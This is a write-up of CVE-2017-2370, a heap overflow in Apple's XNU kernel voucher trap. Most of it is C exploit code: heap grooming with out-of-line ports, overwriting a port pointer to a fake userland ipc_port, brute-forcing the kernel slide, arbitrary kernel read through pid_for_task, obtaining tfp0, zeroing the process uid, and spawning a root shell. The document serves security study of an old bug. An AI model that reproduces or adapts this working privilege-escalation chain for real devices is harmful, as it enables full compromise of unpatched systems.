# CVE-2017-2370

## Bug
```c
kern_return_t
  mach_voucher_extract_attr_recipe_trap(struct mach_voucher_extract_attr_recipe_args *args)
  {
    ipc_voucher_t voucher = IV_NULL;
    kern_return_t kr = KERN_SUCCESS;
    mach_msg_type_number_t sz = 0; 

    // recipe_size is a pointer
    if (copyin(args->recipe_size, (void *)&sz, sizeof(sz)))     
      return KERN_MEMORY_ERROR;
    // now the value of sz is *(args->recipe_size)

    if (sz > MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE)
      return MIG_ARRAY_TOO_LARGE;

    voucher = convert_port_name_to_voucher(args->voucher_name);
    if (voucher == IV_NULL)
      return MACH_SEND_INVALID_DEST;

    mach_msg_type_number_t __assert_only max_sz = sz;

    if (sz < MACH_VOUCHER_TRAP_STACK_LIMIT) {
      /* keep small recipes on the stack for speed */
      uint8_t krecipe[sz];
      if (copyin(args->recipe, (void *)krecipe, sz)) {
        kr = KERN_MEMORY_ERROR;
        goto done;
      }
      kr = mach_voucher_extract_attr_recipe(voucher, args->key,
                                            (mach_voucher_attr_raw_recipe_t)krecipe, &sz);
      assert(sz <= max_sz);

      if (kr == KERN_SUCCESS && sz > 0)
        kr = copyout(krecipe, (void *)args->recipe, sz);
    } else {
        // krecipe is a pointer
      uint8_t *krecipe = kalloc((vm_size_t)sz);
      if (!krecipe) {
        kr = KERN_RESOURCE_SHORTAGE;
        goto done;
      }

        // args->recipe_size is a pointer! A pointer is passed a length here, which cause a heap overflow.
      if (copyin(args->recipe, (void *)krecipe, args->recipe_size)) {
        kfree(krecipe, (vm_size_t)sz);
        kr = KERN_MEMORY_ERROR;
        goto done;
      }

      kr = mach_voucher_extract_attr_recipe(voucher, args->key,
                                            (mach_voucher_attr_raw_recipe_t)krecipe, &sz);
      assert(sz <= max_sz);

      if (kr == KERN_SUCCESS && sz > 0)
        kr = copyout(krecipe, (void *)args->recipe, sz);
      kfree(krecipe, (vm_size_t)sz);
    }

    kr = copyout(&sz, args->recipe_size, sizeof(sz));

  done:
    ipc_voucher_release(voucher);
    return kr;
  }
```
Luckily, args->recipe can be controlled in user mode, and ```copyout``` will stop when it meets an unmap memory. So we can also control the overflow length by umapping the memory.

## Exploit
When we send OOL ports

```c
mach_msg_return_t
ipc_kmsg_copyin_body(
	ipc_kmsg_t	kmsg,
	ipc_space_t	space,
	vm_map_t	map) {

    // ...
                case MACH_MSG_OOL_PORTS_DESCRIPTOR: 
                user_addr = ipc_kmsg_copyin_ool_ports_descriptor((mach_msg_ool_ports_descriptor_t *)kern_addr, 
                        user_addr, is_task_64bit, map, space, dest, kmsg, &mr);
                kern_addr++;
                complex = TRUE;
                break;
    // ...
}
```

```ipc_kmsg_copyin_body``` will call ```ipc_kmsg_copyin_ool_ports_descriptor``` to read ool ports and allocate memory for it

```c
mach_msg_descriptor_t *
ipc_kmsg_copyin_ool_ports_descriptor(
        mach_msg_ool_ports_descriptor_t *dsc,
        mach_msg_descriptor_t *user_dsc,
        int is_64bit,
        vm_map_t map,
        ipc_space_t space,
        ipc_object_t dest,
        ipc_kmsg_t kmsg,
        mach_msg_return_t *mr)
{
    // ...

    ports_length = count * sizeof(mach_port_t);
    names_length = count * sizeof(mach_port_name_t);

    if (ports_length == 0) {
        return user_dsc;
    }

    data = kalloc(ports_length);
    // ...

    objects = (ipc_object_t *) data;
    dsc->address = data;

    for ( i = 0; i < count; i++) {
        mach_port_name_t name = names[i];
        ipc_object_t object;

        if (!MACH_PORT_VALID(name)) {
            objects[i] = (ipc_object_t)CAST_MACH_NAME_TO_PORT(name);
            continue;
        }
    }
}
```

It will be cast to ```ipc_object_t```, a pointer to ```ipc_object```. So we can try to send many ```MACH_PORT_DEAD``` to kalloc.256 and overwrite them later and make it point to a fake ```ipc_object``` in user space.

After copyout, the memory will be free.

```c
mach_msg_descriptor_t *
ipc_kmsg_copyout_ool_ports_descriptor(mach_msg_ool_ports_descriptor_t *dsc,
        mach_msg_descriptor_t *user_dsc,
        int is_64bit,
        vm_map_t map,
        ipc_space_t space,
        ipc_kmsg_t kmsg,
        mach_msg_return_t *mr) {
  // ...
          if (rcv_addr != 0) {
            mach_port_t *objects = (mach_port_t *) dsc->address;
            mach_port_name_t *names = (mach_port_name_t *) dsc->address;

            /* copyout port rights carried in the message */

            for ( i = 0; i < count ; i++) {
                ipc_object_t object = (ipc_object_t)objects[i];

                *mr |= ipc_kmsg_copyout_object(space, object,
                        disp, &names[i]);
            }

            /* copyout to memory allocated above */
            void *data = dsc->address;
            if (copyoutmap(map, data, rcv_addr, names_length) != KERN_SUCCESS)
                *mr |= MACH_MSG_VM_SPACE;
            kfree(data, ports_length);
  // ...
}
```



### Heap Fengshui
Since iOS 9, Apple added `random_free_to_zone()` when calling `zcram` which will randomly insert element to the beginning or ending of `free_elements`. It will be called when try to expand the zone when zone is empty.  So we need some trick to control the memory layout of kernel zone. 

`zalloc` will call `try_alloc_from_zone`(called by `zalloc_internal` actually). It will return the first element in the `free_list`.

```c
// osfmk/kern/zalloc.c
static inline vm_offset_t
try_alloc_from_zone(zone_t zone,
                    boolean_t* check_poison)
{
  // ...
  element = (vm_offset_t)page_metadata_get_freelist(page_meta);
  // ...
  vm_offset_t *primary = (vm_offset_t *) element;
	vm_offset_t *backup  = get_backup_ptr(zone->elem_size, primary);

	/* 
	 * Since the primary next pointer is xor'ed with zp_nopoison_cookie
	 * for obfuscation, retrieve the original value back
	 */
	vm_offset_t  next_element          = *primary ^ zp_nopoison_cookie;
	vm_offset_t  next_element_primary  = *primary;
	vm_offset_t  next_element_backup   = *backup;
  // ...
  return element;
}
```

And `free_to_zone` will add free element to the front of `free_list`

```c
static inline void
free_to_zone(zone_t      zone,
             vm_offset_t element,
             boolean_t   poison);
```



We use the following steps to control the memory layout

- First, send a lot of messages with OOL ports to kernel(don't send to much messages here). 

- Then receive some messages to free some ports in kalloc.256. 

- Finally, send some messages again, then newly allocated memory will be allocated near the area that was just freed.

### Overflow

Preparing parameter.
```c
	uint64_t cp_size = kalloc_size + 8;  // 8 for overflow size
	uint64_t roundup_size = roundup(cp_size, getpagesize());
	uint64_t alloc_size = roundup_size + getpagesize();
```

Allocating memory
```c
kr = mach_vm_allocate(mach_task_self(), &map_addr, alloc_size, VM_FLAGS_ANYWHERE);
```

Unmapping memory, so it will only copy the memory between ```start``` and ```end```.
```c
	uint64_t base = map_addr;
	uint64_t end = base + roundup_size;

	kr = mach_vm_deallocate(mach_task_self(), end, getpagesize());	// unmap the memory
    uint64_t start = end - cp_size;
```

Overwrite next port, make it point to our fakeport.
```c
	memset(recipe, 0x41, kalloc_size);
	memcpy(recipe + kalloc_size, (uint8_t *)&fakeport, 8);
```

Finally, we can trigger the bug, `vp` is voucher port here.
```c
kr = mach_voucher_extract_attr_recipe_trap(vp, 1, recipe, recipe_size);
```

### Privilege escalation

Now the `mach_port_t` points to our fake `ipc_port` in user space, which is completely controlled by us. We need to spawn our root shell.

Let's take a look at the `port` structure.

```c
struct port {
	// ...
  kauth_cred_t	p_ucred;		/* Process owner's identity. (PL) */ // offset: 0xe8
  // ...
};
```

```c
struct ucred {
	TAILQ_ENTRY(ucred)	cr_link; /* never modify this without KAUTH_CRED_HASH_LOCK */
	u_long	cr_ref;			/* reference count */
	
struct posix_cred {
	/*
	 * The credential hash depends on everything from this point on
	 * (see kauth_cred_get_hashkey)
	 */
	uid_t	cr_uid;			/* effective user id */		// offset: 0x18
	uid_t	cr_ruid;		/* real user id */
	uid_t	cr_svuid;		/* saved user id */
	short	cr_ngroups;		/* number of groups in advisory list */
	gid_t	cr_groups[NGROUPS];	/* advisory group list */
	gid_t	cr_rgid;		/* real group id */
	gid_t	cr_svgid;		/* saved group id */
	uid_t	cr_gmuid;		/* UID for group membership purposes */
	int	cr_flags;		/* flags on credential */
} cr_posix;
	struct label	*cr_label;	/* MAC label */
	/* 
	 * NOTE: If anything else (besides the flags)
	 * added after the label, you must change
	 * kauth_cred_find().
	 */
	struct au_session cr_audit;		/* user auditing data */
};
```

If we can set  `uid_t cr_uid` to `0` then we can get root privilege. XNU kernel uses a link list called `allproc` to maintain the processes. So after getting kernel slide and get kernel memory rw we can easily overwrite our uid in `allproc`.

### KASLR

We already have an `ipc_port` fully controlled by us. Take a look at the following routine.

```c
kern_return_t
clock_sleep_trap(
	struct clock_sleep_trap_args *args) {
  // ...
  
  if (clock_name == MACH_PORT_NULL)
		clock = &clock_list[SYSTEM_CLOCK];
	else
		clock = port_name_to_clock(clock_name);

	swtime.tv_sec  = sleep_sec;
	swtime.tv_nsec = sleep_nsec;

	/*
	 * Call the actual clock_sleep routine.
	 */
	rvalue = clock_sleep_internal(clock, sleep_type, &swtime);
	// ...
}
```

and `clock_sleep_internal` will return `KERN_FAILURE` when `clock != &clock_list[SYSTEM_CLOCK]`.And `port_name_to_clock` returns `port->ip_kobject;`  So we can find the address of `clock_list` by brute force search.

```c
	kern_return_t kr = 0;
	uint64_t clock_list = 0xffffff8000a271c0;   // nm /System/Library/Kernel/kernel | grep _clock_list
	uint64_t allproc = 0xffffff8000abb490;			// nm /System/Library/Kernel/kernel | grep allproc
	uint64_t clock_list_addr = 0;
	uint64_t base = 0xffffff8000200000;  // kernel_base_addr = 0x200000 * slide_value + base
	uint64_t kernel_slide = 0;
	boolean_t found_clock = 0;

	fakeport->io_bits = IO_BITS_ACTIVE | IKOT_CLOCK;	// fake clock
	fakeport->io_lock_data[12] = 0x11;

	for (int i = 0; i < 0xFFFF; i++) {
		for (int k = 0; k <= 0x200000 / 8; k += 8) {
			*(uint64_t *)(((uint64_t)fakeport) + 0x68) = base + i * 0x200000 + k;	// brute force, set fakeport->ip_kobject
			kr = clock_sleep_trap(port, 0, 0, 0, 0);	
			if (kr != KERN_FAILURE) {
				printf("[+] found clock_list! 0x%llx\n", *(uint64_t *)(((uint64_t)fakeport) + 0x68));
				clock_list_addr = *(uint64_t *)(((uint64_t)fakeport) + 0x68);
				found_clock = 1;
				goto found;
			}
		}
	}
```

After finding clock, we can get kernel slide easily.

```c
	kernel_slide = clock_list_addr - clock_list;
	allproc += kernel_slide;
```

### Read arbitrary kernel memory

After reading XNU source code, we can find that

```c
kern_return_t
pid_for_task(
	struct pid_for_task_args *args)
{
	mach_port_name_t	t = args->t;
	user_addr_t		pid_addr  = args->pid;  
	proc_t p;
	task_t		t1;
	int	pid = -1;
	kern_return_t	err = KERN_SUCCESS;

	AUDIT_MACH_SYSCALL_ENTER(AUE_PIDFORTASK);
	AUDIT_ARG(mach_port1, t);

	t1 = port_name_to_task(t);

	if (t1 == TASK_NULL) {
		err = KERN_FAILURE;
		goto pftout;
	} else {
		p = get_bsdtask_info(t1);
		if (p) {
			pid  = proc_pid(p);
			err = KERN_SUCCESS;
		} else {
			err = KERN_FAILURE;
		}
	}
	task_deallocate(t1);
pftout:
	AUDIT_ARG(pid, pid);
	(void) copyout((char *) &pid, pid_addr, sizeof(int));
	AUDIT_MACH_SYSCALL_EXIT(err);
	return(err);
}
```

`pid_for_task` won't check wether the task is valid or not, but simply return 

```c
*(*(uint64_t *)(task + 0x380) + 0x10)
```

Remember that we have a fake port already and we also have a `mach_port_t` points to that port we have. So we can achieve arbitrary kernel memory reading by using `pid_for_task`.

```c
uint32_t read_kernel(mach_port_t port, void *faketask, uint64_t addr) {
	uint32_t res;
	*(uint64_t *)(faketask + 0x380) = addr - 0x10;
	pid_for_task(port, &res);
	return res;
}
```

Now, convert our fake port to a task port.

```c
	fakeport->io_bits = IKOT_TASK | IO_BITS_ACTIVE;  // cast fakeport to a task
	fakeport->io_references = 0xff;
	char *faketask = ((char *)fakeport) + 0x1000;
```

Set the `kobject` to our faketask

```c
	*(uint64_t *)(((uint64_t)fakeport) + 0x68) = faketask;
	*(uint64_t *)(((uint64_t)fakeport) + 0xa0) = 0xff;
	*(uint64_t *)(faketask + 0x10) = 0xee;
```

Now we can find kernel proc and our own proc.

```c
	printf("[*] try to find kernel proc\n");
	uint32_t proc_offset = 0, r1, r2;
	uint64_t kernel_proc = 0, self_proc = 0;
	while (1) {
		uint64_t n;
		r1 = read_kernel(port, faketask, allproc);
		r2 = read_kernel(port, faketask, allproc + 0x4);
		memcpy((char *)&n, &r1, sizeof(uint32_t));
		memcpy((char *)&n + 4, &r2, sizeof(uint32_t));

		uint32_t proc = read_kernel(port, faketask, allproc + 0x10);		// pid is located at the offset of 0x10
		if (proc == getpid()) {
			self_proc = allproc;
			printf("[+] found self proc pid=%d addr=0x%llx\n", proc, self_proc);
		} else if (proc == 0) {
			kernel_proc = allproc;
			printf("[+] found kernel proc pid=%d addr=0x%llx\n", proc, kernel_proc);
		}
		allproc = n;		// next pointer is at the offset of 0

		if (self_proc != 0 && kernel_proc != 0) break;
	}
```

### Arbitrary kernel memory writing

After getting the address of `kernel_proc`, we can dump the whole `task` and task port sturcture to user land.

```c
	char *kernel_task_port_dump = malloc(0x1000);
	char *kernel_task_dump = malloc(0x1000);

	uint64_t kernel_task = 0, kernel_itk_self = 0;  // osfmk/kern/task
	
	// check the sturcture to get the following offset 
	r1 = read_kernel(port, faketask, kernel_proc + 0x18);
	r2 = read_kernel(port, faketask, kernel_proc + 0x18 + 0x4);
	memcpy((char *)&kernel_task, &r1, sizeof(uint32_t));
	memcpy((char *)&kernel_task + 4, &r2, sizeof(uint32_t));
	printf("[+] kernel_task=0x%llx, kernel_itk_sself=0x%llx\n", kernel_task, kernel_itk_self);

	r1 = read_kernel(port, faketask, kernel_task + 0xe8);
	r2 = read_kernel(port, faketask, kernel_task + 0xe8 + 0x4);
	memcpy((char *)&kernel_itk_self, &r1, sizeof(uint32_t));
	memcpy((char *)&kernel_itk_self + 4, &r2, sizeof(uint32_t));

	printf("[+] kernel_task=0x%llx, kernel_itk_sself=0x%llx\n", kernel_task, kernel_itk_self);
	
	for (int i = 0; i < 0x1000 / 4; ++i) {
		r1 = read_kernel(port, faketask, kernel_task + i * 4);
		memcpy(kernel_task_dump + i * 4, &r1, sizeof(uint32_t));
	}

	for (int i = 0; i < 0x1000 / 4; ++i) {
		r1 = read_kernel(port, faketask, kernel_itk_self + i * 4);
		memcpy(kernel_task_port_dump + i * 4, &r1, sizeof(uint32_t));
	}

	memcpy(fakeport, kernel_task_port_dump, 0x1000);
	memcpy(faketask, kernel_task_dump, 0x1000);
```

Then we use `task_get_special_port` to clone a send right for one of the task's special ports.

```c
	*(uint64_t *)(((uint64_t)fakeport) + 0x68) = faketask;
	*(uint64_t *)(((uint64_t)fakeport) + 0xa0) = 0xff;

	*(uint64_t *)(((uint64_t)faketask) + 0x2b8) = kernel_itk_self;
	mach_port_t tfp0;

	task_get_special_port(port, 4, &tfp0);
	printf("[+] tfp0 0x%x\n", tfp0);
	fakeport->io_bits = 0;
```

### Time to get root!

Now we can directly overwrite uid to get root privilege.

```c
	//get root
	uint64_t cred;
	r1 = read_kernel(port, faketask, self_proc + 0xe8);
	r2 = read_kernel(port, faketask, self_proc + 0xe8 + 0x4);
	memcpy((char *)&cred, &r1, sizeof(uint32_t));
	memcpy((char *)&cred + 4, &r2, sizeof(uint32_t));
```

```c
	uint64_t u = 0;
	mach_vm_write(tfp0, cred + 0x18, (vm_offset_t)&u, (mach_msg_type_number_t)8);
	if (getuid() == 0) printf("[+] g0t r00t! getuid = %d\n", getuid());
```

Get root shell now!

```c
system("/bin/bash");
```



### Some sturcture we use...

```c
typedef struct ipc_port	        *ipc_port_t;

#define IPC_PORT_NULL		((ipc_port_t) 0UL)
#define IPC_PORT_DEAD		((ipc_port_t)~0UL)
#define IPC_PORT_VALID(port) \
	((port) != IPC_PORT_NULL && (port) != IPC_PORT_DEAD)

typedef ipc_port_t 		mach_port_t;
```

```c
extern kern_return_t clock_sleep_trap(
	mach_port_name_t clock_name,
	sleep_type_t sleep_type,
	int sleep_sec,
	int sleep_nsec,
	mach_timespec_t *wakeup_time);
```

```c
struct	proc {
	LIST_ENTRY(proc) p_list;		/* List of all processes. */

	pid_t		p_pid;			/* Process identifier. (static)*/
	void * 		task;			/* corresponding task (static)*/
    // ...
}
```